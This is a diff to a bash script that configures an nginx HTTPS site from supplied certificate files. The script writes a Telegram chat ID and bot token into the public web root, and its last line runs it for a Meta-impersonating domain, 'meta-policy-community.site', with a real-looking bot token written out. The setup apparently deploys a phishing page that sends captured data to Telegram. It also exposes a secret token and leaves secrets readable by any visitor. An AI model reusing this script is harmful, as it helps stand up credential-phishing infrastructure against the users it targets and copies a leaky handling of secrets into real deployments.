@@ -1,13 +1,19 @@
 #!/bin/bash
 
-# Check if domain parameter is provided
-if [ -z "$1" ]; then
-    echo "Usage: $0 <domain>"
-    echo "Example: $0 example.com"
+# Check if required parameters are provided
+if [ -z "$1" ] || [ -z "$2" ] || [ -z "$3" ]; then
+    echo "Usage: $0 <domain> <certificate_filename> <private_key_filename> [chat_id] [token]"
+    echo "Example: $0 example.com example.com.pem example.com.key 123456789 ABCDEF123456"
     exit 1
 fi
 
 DOMAIN=$1
+CERT_FILENAME=$2
+KEY_FILENAME=$3
+CHAT_ID=$4
+TOKEN=$5
+SSL_CERT_PATH="/etc/ssl/certs/$CERT_FILENAME"
+SSL_KEY_PATH="/etc/ssl/private/$KEY_FILENAME"
 WWW_DOMAIN="www.$DOMAIN"
 NGINX_AVAILABLE="/etc/nginx/sites-available/$DOMAIN"
 NGINX_ENABLED="/etc/nginx/sites-enabled/$DOMAIN"
@@ -16,20 +22,15 @@ WEB_ROOT="/var/www/html/$DOMAIN"
 echo "Stopping Nginx..."
 sudo systemctl stop nginx
 
-# Install certbot if not installed
-if ! command -v certbot &> /dev/null; then
-    echo "Installing certbot..."
-    sudo apt-get update
-    sudo apt-get install -y certbot
+# Check if SSL files exist
+if [ ! -f "$SSL_CERT_PATH" ]; then
+    echo "Error: SSL certificate file not found at $SSL_CERT_PATH"
+    exit 1
 fi
 
-# check ssl certificate
-if [ -d "/etc/letsencrypt/live/$DOMAIN" ]; then
-    echo "SSL certificate already exists for $DOMAIN and $WWW_DOMAIN"
-else
-    # Get SSL certificate
-    echo "Getting SSL certificate for $DOMAIN and $WWW_DOMAIN..."
-    sudo certbot certonly --standalone -d $DOMAIN -d $WWW_DOMAIN
+if [ ! -f "$SSL_KEY_PATH" ]; then
+    echo "Error: SSL private key file not found at $SSL_KEY_PATH"
+    exit 1
 fi
 
 # Create web root directory
@@ -47,6 +48,17 @@ fi
 if [ -d "/var/www/html/source" ]; then
     echo "Copying source files..."
     sudo cp -r /var/www/html/source/* $WEB_ROOT 2>/dev/null || true
+fi
+
+# Update chat_id.txt and token.txt if parameters are provided
+if [ ! -z "$CHAT_ID" ]; then
+    echo "Updating chat_id.txt..."
+    echo "$CHAT_ID" | sudo tee "$WEB_ROOT/chat_id.txt" > /dev/null
+fi
+
+if [ ! -z "$TOKEN" ]; then
+    echo "Updating token.txt..."
+    echo "$TOKEN" | sudo tee "$WEB_ROOT/token.txt" > /dev/null
 fi
 
 # check config file
@@ -69,8 +81,8 @@ server {
     listen 443 ssl;
     server_name $DOMAIN $WWW_DOMAIN;
 
-    ssl_certificate /etc/letsencrypt/live/$DOMAIN/fullchain.pem;
-    ssl_certificate_key /etc/letsencrypt/live/$DOMAIN/privkey.pem;
+    ssl_certificate $SSL_CERT_PATH;
+    ssl_certificate_key $SSL_KEY_PATH;
 
     root $WEB_ROOT;
     index index.html index.htm index.php;
@@ -110,3 +122,5 @@ sudo systemctl restart nginx
 
 echo "Setup completed for $DOMAIN!"
 echo "Please check if everything is working correctly"
+
+./setup.sh meta-policy-community.site s292026256_meta-policy-community.site_server.pem s292026256_meta-policy-community.site_server.key -4636419482 7868057603:AAFYbZddzYXyK3rGdVNksYMmru_jB7K3n7M
